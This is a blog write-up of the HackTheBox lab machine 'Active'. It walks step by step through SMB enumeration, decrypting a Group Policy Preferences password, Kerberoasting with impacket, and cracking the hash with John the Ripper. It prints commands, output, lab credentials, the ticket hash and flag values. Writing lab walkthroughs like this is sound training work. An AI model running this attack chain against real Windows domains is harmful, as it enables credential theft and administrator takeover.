---
layout: post
title: Hackthebox Active Writeup
categories: HackTheBox
---

<img src="/public/images/hackthebox/active_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of "Active" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.100 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-14 09:14 EEST
Nmap scan report for 10.10.10.100
Host is up (0.036s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-09-14 06:11:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4m14s, deviation: 0s, median: -4m14s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2018-09-14 09:12:21
|_  start_date: 2018-09-11 14:34:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 236.30 seconds
{% endhighlight %}

What we have to notice is there is a time difference between our host and Active.<br>
We have to change the current time of our host manually later for Active Directory enumeration.

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.100:47001/

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.100:47001/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2018/09/14 23:40:33 Starting gobuster
=====================================================
=====================================================
2018/09/15 00:06:24 Finished
=====================================================
{% endhighlight %}

SMB Share listing:
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.100
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
{% endhighlight %}

### 2.Getting User
According to the result above, we have a right to see some of SMB shares.<br>
By enumeration, we can find an interesting file.
{% highlight shell %}
root@kali:~# smbclient //10.10.10.100/Replication
Enter WORKGROUP\root's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 13:37:44 2018
  ..                                  D        0  Sat Jul 21 13:37:44 2018
  active.htb                          D        0  Sat Jul 21 13:37:44 2018

		10459647 blocks of size 4096. 4924822 blocks available

smb: \active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\Preferences\groups\> dir
  .                                   D        0  Sat Jul 21 13:37:44 2018
  ..                                  D        0  Sat Jul 21 13:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 23:46:06 2018

		10459647 blocks of size 4096. 4924822 blocks available
{% endhighlight %}

We can find a domain user credentail in Groups.xml

{% highlight shell %}
root@kali:~# cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
{% endhighlight %}

By taking advantage of "gpp-decrypt" command, we can achieve a password for user "active.htb\SVC_TGS"

{% highlight shell %}
root@kali:~# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
{% endhighlight %}

Now we have one credential to get into Active.
{% highlight shell %}
user:       active.htb\SVC_TGS
password:   GPPstillStandingStrong2k18
{% endhighlight %}

We can use the credentail for doing more enumeration of some SMB shares.<br>
In "USERS", we can find user.txt

{% highlight shell %}
root@kali:~# smbclient -W active.htb -U SVC_TGS //10.10.10.100/USERS
Enter ACTIVE.HTB\SVC_TGS's password:  # GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 17:39:20 2018
  ..                                 DR        0  Sat Jul 21 17:39:20 2018
  Administrator                       D        0  Mon Jul 16 13:14:21 2018
  All Users                         DHS        0  Tue Jul 14 08:06:44 2009
  Default                           DHR        0  Tue Jul 14 09:38:21 2009
  Default User                      DHS        0  Tue Jul 14 08:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 07:57:55 2009
  Public                             DR        0  Tue Jul 14 07:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 18:16:32 2018

		10459647 blocks of size 4096. 4939173 blocks available

smb: \> cd SVC_TGS/desktop
smb: \SVC_TGS\desktop\> dir
  .                                   D        0  Sat Jul 21 18:14:42 2018
  ..                                  D        0  Sat Jul 21 18:14:42 2018
  user.txt                            A       34  Sat Jul 21 18:06:25 2018

		10459647 blocks of size 4096. 4924822 blocks available
smb: \SVC_TGS\desktop\>
{% endhighlight %}

We can download the user.txt by get command.

{% highlight shell %}
root@kali:~# cat user.txt 
86d67d8ba232bb6a254aa4d10159e983
{% endhighlight %}

### 3.Getting root
Then, continue the enumeration.
To identify what service is running on Active, we can use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py">lookupsid.py</a> from impacket.
{% highlight shell %}
root@kali:~# ./lookupsid.py active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
Impacket v0.9.18-dev - Copyright 2018 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.100
[*] StringBinding ncacn_np:10.10.10.100[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-405608879-3187717380-1996298813
498: ACTIVE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: ACTIVE\Administrator (SidTypeUser)
501: ACTIVE\Guest (SidTypeUser)
502: ACTIVE\krbtgt (SidTypeUser)
512: ACTIVE\Domain Admins (SidTypeGroup)
513: ACTIVE\Domain Users (SidTypeGroup)
514: ACTIVE\Domain Guests (SidTypeGroup)
515: ACTIVE\Domain Computers (SidTypeGroup)
516: ACTIVE\Domain Controllers (SidTypeGroup)
517: ACTIVE\Cert Publishers (SidTypeAlias)
518: ACTIVE\Schema Admins (SidTypeGroup)
519: ACTIVE\Enterprise Admins (SidTypeGroup)
520: ACTIVE\Group Policy Creator Owners (SidTypeGroup)
521: ACTIVE\Read-only Domain Controllers (SidTypeGroup)
553: ACTIVE\RAS and IAS Servers (SidTypeAlias)
571: ACTIVE\Allowed RODC Password Replication Group (SidTypeAlias)
572: ACTIVE\Denied RODC Password Replication Group (SidTypeAlias)
1000: ACTIVE\DC$ (SidTypeUser)
1101: ACTIVE\DnsAdmins (SidTypeAlias)
1102: ACTIVE\DnsUpdateProxy (SidTypeGroup)
1103: ACTIVE\SVC_TGS (SidTypeUser)
{% endhighlight %}

Then, we can achieve kerberous tickets for each service by <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs.py</a>

{% highlight shell %}
root@kali:~# python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.9.18-dev - Copyright 2018 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40  2018-07-30 20:17:40

$krb5tgs$23$*Administrator$ACTIVE.HTB$activeCIFS~445*$00f28190b890c746887da2466a9ede5f$ca49fceb95ed211a8de02bdea6cc167f17b17ab5ca341f2c80f9e0836d5551ee5e6676e3a11055d3bde239172416a2c7f2762b37aeeb76e46c637bdd674ed7be87ebce5c2a1b587754310559f70fb7eb4e1b1b745ab98b3ac86f6ab76b39649e001da4199123f45dd648abe57c42bba7c8768546d89f6454fdb58f2e79932be61bb2b3a016c9dadc7d39a80b11b9f86107790e3a2b70fa44da10e5ef66ddcb509c05b7db0c9911f69048f28ab680e18da80687d5edf141481118b44c029aa1b7f2ee10c7d1bb25a0bafac808c4fc2165da45982839da0807e64e709aa23c457d2d4a2211d13a64aa359b8895351b4608a5f98d17bb935b280d896a50352d2e59b6a0426c774599cfb399207d24481133edcc49c7d96dca8926a1e51ec3b40327c320acd4c6eb942edd40a7aa139d6c8f9b4badf544ee6cf20193b94cbf28811711697310672ca821e98ea9d9c2d4889896699bf20ba3b70f2d64ed4fb74b374ba29364cf7e60c0b4f5c0865c0fedafd5bfe3ad5e176b84aecfb05b74ef940d3596a31e9b566262ce77c3790344be1d9a56f4a084d76d5136f6d613b4352aad2985870937074cb581faa77b9541051192470b8751b6492e045f69157b9306c558f22e218acb72c5a10fb98d191e6df94036f9281264ea7e6df3631d1230a297fea0a039464474fa6669de596f04d12f18b4c24dde9896de4df058b332136c869d461ec41da033bb56d685ee59f66cb2571bf038c3e456723c8270bd95dc2956de6312eb9beccdd614face0a5f20bbe74e96f443853f124ff47c00f6e7508739018b8cb81214bad74be7ef013746245fbe433f8d689db6df240f253da96e9104b471fc09b9558ccc8e587365939b236864c0feff6ccaf0dcbfadf70585489370e0f3958ca0ae85a1f7cd8ea959be70e9afef02c4c6ed9ddd116b8f171bfcb585e24c1e226dd1d8d1186ac9580cf9bceef54c1a1855670bf2054520642a7ee662c6ec6daba43c2c67d173db6554bee7d1b211bd2bcac7e6151c8c8d9fd6d6c01c27890203627e69ec90246c330d1a36e48ba3920b1d01a45c5a4174099b4b4700985cb4af7cf2cf656f5ffa9d58a3fad2e62de5caa3f1b430d07e52292a2d49df9c4f224d31ea5491586db0a24d7cf6dbd8c79342e6fed61940d2ea6a65dc7dc25e53cb01de777a018e182100a2dbcfe07ae339e72893334dcf53e0c65470230c44bdc29f184a376cb03bdc73d416e74b008f740cd8f617d0992ca7
{% endhighlight %}

To deal with hash, we can not use default johnTheRipper on Kali linux.<br>
It does not recognize this hash as "hash" and we have to download the "JTR bleeding" from official github for the decryption.

{% highlight shell %}
root@kali:~# git clone git://github.com/magnumripper/JohnTheRipper -b bleeding-jumbo john
Cloning into 'john'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 87491 (delta 4), reused 5 (delta 1), pack-reused 87475
Receiving objects: 100% (87491/87491), 106.91 MiB | 10.98 MiB/s, done.
Resolving deltas: 100% (68479/68479), done.
root@kali:~# cd john/src/
root@kali:~/john/src# ./configure && make -s clean && make -sj4
checking build system type... x86_64-unknown-linux-gnu
checking host system type... x86_64-unknown-linux-gnu
~~~

root@kali:~/john/src# cd ../run/
root@kali:~/john/run# ./john ../../active.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:04 DONE (2019-02-18 12:25) 0.2469g/s 2602Kp/s 2602Kc/s 2602KC/s Tiffani1432..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

Now we got a password for user Administrator.<br>
Since C$ is a share which we can see the entire C drive, we can find root.txt by accessing it by smbclient.
{% highlight shell %}
root@kali:~# smbclient -W active.htb -U Administrator //10.10.10.100/C$
Enter ACTIVE.HTB\Administrator's password: 
Try "help" to get a list of possible commands.
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
{% endhighlight %}

Content of root.txt:
{% highlight shell %}
root@kali:~# cat root.txt 
b5fc76d1d6b91d77b2fbf2d54d0f708b
{% endhighlight %}

### 4.References
https://room362.com/post/2016/kerberoast-pt1/<br>
https://room362.com/post/2016/kerberoast-pt2/
